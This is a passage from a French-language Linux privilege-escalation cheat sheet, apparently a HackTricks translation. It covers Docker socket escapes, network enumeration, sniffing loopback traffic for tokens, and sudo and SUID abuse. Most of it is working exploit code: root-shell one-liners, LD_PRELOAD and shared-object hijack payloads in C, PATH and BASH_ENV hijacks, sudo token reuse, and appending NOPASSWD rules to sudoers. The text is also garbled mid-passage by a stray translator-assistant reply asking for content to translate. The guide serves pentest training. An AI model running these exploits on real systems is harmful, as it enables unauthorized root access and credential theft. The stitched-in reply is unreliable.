Si vous avez un accès en écriture au socket Docker, vous pouvez escalate privileges en utilisant les commandes suivantes :
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes vous permettent d'exécuter un container avec un accès root au système de fichiers de l'hôte.

#### **Using Docker API Directly**

Dans les cas où le Docker CLI n'est pas disponible, le Docker socket peut toujours être manipulé en utilisant le Docker API et des commandes `curl`.

1.  **List Docker Images:** Récupérer la liste des images disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envoyer une requête pour créer un container qui monte le répertoire racine du système hôte.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Démarrer le container nouvellement créé :

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Utilisez `socat` pour établir une connexion au container, permettant l'exécution de commandes à l'intérieur.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Après avoir configuré la connexion `socat`, vous pouvez exécuter des commandes directement dans le container avec un accès root au système de fichiers de l'hôte.

### Others

Notez que si vous avez des permissions d'écriture sur le docker socket parce que vous êtes **à l'intérieur du groupe `docker`** vous avez [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Si la [**docker API is listening in a port** vous pouvez également être en mesure de la compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consultez **plus de façons de sortir de docker ou de l'abuser pour escalader les privilèges** dans :


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Si vous constatez que vous pouvez utiliser la commande **`ctr`**, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader les privilèges** :


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Si vous constatez que vous pouvez utiliser la commande **`runc`**, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader les privilèges** :


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d'interagir et de partager des données de manière efficace. Conçu pour les systèmes Linux modernes, il offre un cadre robuste pour différentes formes de communication entre applications.

Le système est polyvalent, supportant un IPC basique qui améliore l'échange de données entre processus, semblable à des **enhanced UNIX domain sockets**. De plus, il facilite la diffusion d'événements ou de signaux, favorisant une intégration fluide entre les composants du système. Par exemple, un signal d'un daemon Bluetooth concernant un appel entrant peut pousser un lecteur multimédia à couper le son, améliorant l'expérience utilisateur. D-Bus prend également en charge un système d'objets distants, simplifiant les requêtes de service et les invocations de méthodes entre applications, rationalisant des processus traditionnellement complexes.

D-Bus fonctionne sur un modèle **allow/deny**, gérant les permissions des messages (appels de méthode, émissions de signaux, etc.) basé sur l'effet cumulatif des règles de politique correspondantes. Ces politiques spécifient les interactions avec le bus, pouvant potentiellement permettre une escalade de privilèges via l'exploitation de ces permissions.

Un exemple d'une telle politique dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les permissions pour l'utilisateur root afin de posséder, envoyer vers, et recevoir des messages de `fi.w1.wpa_supplicant1`.

Les politiques sans utilisateur ou groupe spécifié s'appliquent universellement, tandis que les politiques de contexte "default" s'appliquent à tous ceux qui ne sont pas couverts par d'autres politiques spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez comment énumérer et exploiter une communication D-Bus ici :**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triage rapide du filtrage sortant

Si le host peut exécuter des commandes mais que les callbacks échouent, séparez rapidement le filtrage DNS, de transport, de proxy et de routage :
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ports ouverts

Vérifiez toujours les services réseau en cours d'exécution sur la machine avec lesquels vous n'avez pas pu interagir avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners by bind target:

- `0.0.0.0` / `[::]`: exposés sur toutes les interfaces locales.
- `127.0.0.1` / `::1`: accessibles uniquement localement (bons candidats pour tunnel/forward).
- IP internes spécifiques (p.ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): généralement accessibles uniquement depuis des segments internes.

### Flux de triage des services accessibles uniquement localement

Lorsque vous compromettez un hôte, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Un flux de triage local rapide :
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS comme scanner réseau (mode réseau uniquement)

En plus des vérifications PE locales, linPEAS peut fonctionner comme un scanner réseau ciblé. Il utilise les binaires disponibles dans `$PATH` (typiquement `fping`, `ping`, `nc`, `ncat`) et n'installe pas d'outils.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si vous passez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un scanner réseau pur (en sautant le reste des privilege-escalation checks).

### Sniffing

Vérifiez si vous pouvez sniff le trafic. Si oui, vous pourriez être capable de récupérer des identifiants.
```
timeout 1 tcpdump
```
Vérifications pratiques rapides :
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) est particulièrement précieux en post-exploitation, car de nombreux services accessibles uniquement en interne y exposent des tokens/cookies/credentials :
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Merci — collez ici le contenu de src/linux-hardening/privilege-escalation/README.md que vous souhaitez que je traduise. 

Je traduirai en français en respectant strictement vos consignes : conserver exactement la même syntaxe markdown/html, ne pas traduire le code, les noms de techniques, les mots-clés (ex. leak, pentesting), les plateformes cloud, les liens, chemins et les tags {#...} mentionnés.
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Utilisateurs

### Énumération Générique

Vérifiez **qui** vous êtes, quels **privilèges** avez-vous, quels **utilisateurs** sont dans les systèmes, lesquels peuvent **login** et lesquels ont des **privilèges root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID élevé

Certaines versions de Linux ont été affectées par un bug qui permet à des utilisateurs avec **UID > INT_MAX** d'escalader les privilèges. Plus d'infos : [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder les privilèges root :


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique des mots de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous connecter pour chaque utilisateur** en utilisant ce mot de passe.

### Su Brute

Si cela ne vous dérange pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur la machine, vous pouvez essayer de brute-force un utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de brute-force des utilisateurs.

## Abus du $PATH inscriptible

### $PATH

Si vous constatez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être capable d'escalader les privilèges en **créant une backdoor dans le dossier inscriptible** portant le nom d'une commande qui va être exécutée par un autre utilisateur (idéalement root) et qui **n'est pas chargée à partir d'un répertoire situé avant** votre dossier inscriptible dans le $PATH.

### SUDO and SUID

Vous pourriez être autorisé à exécuter certaines commandes via sudo ou celles-ci pourraient avoir le bit suid. Vérifiez-le en utilisant :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certaines **commandes inattendues vous permettent de lire et/ou d'écrire des fichiers voire d'exécuter une commande.** Par exemple :
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration de Sudo peut permettre à un utilisateur d'exécuter une commande avec les privilèges d'un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root` ; il est maintenant trivial d'obtenir un shell en ajoutant une clé ssh dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution de quelque chose :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** à **PYTHONPATH hijacking** pour charger une bibliothèque python arbitraire lors de l'exécution du script en root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV préservé via sudo env_keep → shell root

Si sudoers préserve `BASH_ENV` (par ex., `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non-interactif de Bash pour exécuter du code arbitraire en tant que root lors de l'appel d'une commande autorisée.

- Pourquoi cela fonctionne : pour les shells non-interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d'exécuter le script cible. Beaucoup de règles sudo autorisent l'exécution d'un script ou d'un wrapper de shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.

- Prérequis :
- Une règle sudo que vous pouvez exécuter (n'importe quelle cible qui invoque `/bin/bash` en mode non-interactif, ou tout script bash).
- `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Durcissement :
- Supprimer `BASH_ENV` (et `ENV`) de `env_keep`, préférer `env_reset`.
- Éviter les wrappers shell pour les commandes autorisées par sudo ; utiliser des binaires minimaux.
- Envisager la journalisation I/O et les alertes sudo lorsque des variables d'environnement préservées sont utilisées.

### Terraform via sudo avec HOME préservé (!env_reset)

Si sudo laisse l'environnement intact (`!env_reset`) tout en autorisant `terraform apply`, `$HOME` reste celui de l'utilisateur appelant. Terraform charge donc **$HOME/.terraformrc** en tant que root et respecte `provider_installation.dev_overrides`.

- Pointez le provider requis vers un répertoire accessible en écriture et déposez un plugin malveillant nommé d'après le provider (par ex., `terraform-provider-examples`) :
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform échouera le handshake du plugin Go mais exécutera la payload en tant que root avant de s'arrêter, laissant un SUID shell derrière.

### TF_VAR overrides + symlink validation bypass

Des variables Terraform peuvent être fournies via des variables d'environnement `TF_VAR_<name>`, qui survivent lorsque sudo préserve l'environnement. Des validations faibles telles que `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` peuvent être contournées avec des symlinks :
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform résout le symlink et copie le fichier réel `/root/root.txt` dans une destination lisible par un attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en pré-créant des symlinks de destination (par exemple, en pointant le provider’s destination path à l'intérieur de `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines distributions plus anciennes, sudo peut être configuré avec `requiretty`, ce qui oblige sudo à s'exécuter uniquement depuis un TTY interactif. Si `!requiretty` est défini (ou si l'option est absente), sudo peut être exécuté depuis des contextes non interactifs tels que des reverse shells, des cron jobs ou des scripts.
```bash
Defaults !requiretty
```
Ce n'est pas une vulnérabilité directe en soi, mais cela étend les situations dans lesquelles les règles sudo peuvent être abusées sans nécessiter un PTY complet.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées modifiables par un attaquant (par ex. `/home/<user>/bin`), toute commande relative à l'intérieur de la cible autorisée par sudo peut être masquée.

- Exigences : une règle sudo (souvent `NOPASSWD`) exécutant un script/binaire qui appelle des commandes sans chemins absolus (`free`, `df`, `ps`, etc.) et une entrée `PATH` modifiable qui est cherchée en premier.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo : contournement des chemins d'exécution
**Aller** lire d'autres fichiers ou utiliser des **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **wildcard** est utilisé (\*), c'est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est accordée pour une seule commande **sans préciser le chemin** : _hacker10 ALL= (root) less_, vous pouvez l'exploiter en changeant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut également être utilisée si un binaire **suid** **exécute une autre commande sans spécifier son chemin (vérifiez toujours le contenu d'un binaire SUID étrange avec** _**strings**_**)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Si le binaire **suid** **exécute une autre commande en spécifiant le chemin**, vous pouvez alors essayer de **export a function** nommée comme la commande que le fichier suid appelle.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_ vous devez essayer de créer la fonction et de l'exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le suid binary, cette fonction sera exécutée

### Script modifiable exécuté par un SUID wrapper

Une mauvaise configuration courante d'une custom-app est un wrapper binaire SUID appartenant à root qui exécute un script, alors que le script lui‑même est modifiable par des low-priv users.

Schéma typique:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` est accessible en écriture, vous pouvez ajouter des commandes payload puis exécuter le wrapper SUID :
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vérifications rapides:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ce vecteur d'attaque est particulièrement courant dans les wrappers "maintenance"/"sauvegarde" fournis dans `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** est utilisée pour spécifier une ou plusieurs bibliothèques partagées (.so) à charger par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce procédé est appelé préchargement d'une bibliothèque.

Cependant, pour préserver la sécurité du système et empêcher l'exploitation de cette fonctionnalité, en particulier avec les exécutables **suid/sgid**, le système applique certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables où l'ID utilisateur réel (_ruid_) ne correspond pas à l'ID utilisateur effectif (_euid_).
- Pour les exécutables avec suid/sgid, seules les bibliothèques situées dans des chemins standard qui sont aussi suid/sgid sont préchargées.

Une élévation de privilèges peut se produire si vous pouvez exécuter des commandes avec `sudo` et que la sortie de `sudo -l` inclut l'instruction **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d'environnement **LD_PRELOAD** de persister et d'être reconnue même lorsque les commandes sont exécutées avec `sudo`, ce qui peut conduire à l'exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrer sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite **compile it** en utilisant :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escalate privileges** en exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similaire peut être exploité si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH**, car il contrôle le chemin où les bibliothèques seront recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Lorsque vous rencontrez un binaire avec des permissions **SUID** qui semblent inhabituelles, il est recommandé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère un potentiel d'exploitation.

Pour exploiter cela, on procéderait en créant un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichiers et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci‑dessus en un objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l'exécution du binaire SUID affecté devrait déclencher l'exploit, permettant une compromission potentielle du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un SUID binary qui charge une library depuis un dossier où nous pouvons écrire, créons la library dans ce dossier avec le nom nécessaire :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
cela signifie que la bibliothèque que vous avez générée doit contenir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix qui peuvent être exploités par un attaquant pour contourner des restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous ne pouvez **injecter que des arguments** dans une commande.

Le projet recense des fonctions légitimes de binaires Unix qui peuvent être abusées pour sortir de shells restreints, escalader ou maintenir des privilèges élevés, transférer des fichiers, lancer des bind et reverse shells, et faciliter d'autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez exécuter `sudo -l` vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve comment exploiter une règle sudo.

### Reusing Sudo Tokens

Dans les cas où vous avez **sudo access** mais pas le mot de passe, vous pouvez escalader les privilèges en **attendant l'exécution d'une commande sudo puis en détournant le jeton de session**.

Requirements to escalate privileges:

- Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose au cours des **15 dernières minutes** (par défaut c'est la durée du token sudo qui nous permet d'utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` est 0
- `gdb` est accessible (vous devez pouvoir l'uploader)

(Vous pouvez activer temporairement `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou en modifiant définitivement `/etc/sysctl.d/10-ptrace.conf` et en définissant `kernel.yama.ptrace_scope = 0`)

Si toutes ces conditions sont remplies, **vous pouvez escalader les privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- L'**exploit initial** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le token sudo dans votre session** (vous n'obtiendrez pas automatiquement un shell root, faites `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) va **créer un sudoers file** qui **rend les sudo tokens éternels et permet à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous avez des permissions d'écriture dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en faisant:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers dans `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** n'importe quel fichier, vous pourrez **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez abuser de cette permission
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d'abuser de ces permissions :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo`, comme `doas` sous OpenBSD ; pensez à vérifier sa configuration dans `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si vous savez qu'un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour escalader ses privilèges et que vous avez un shell dans ce contexte utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit lancé.

Notez que si l'utilisateur utilise un shell différent (pas bash) vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

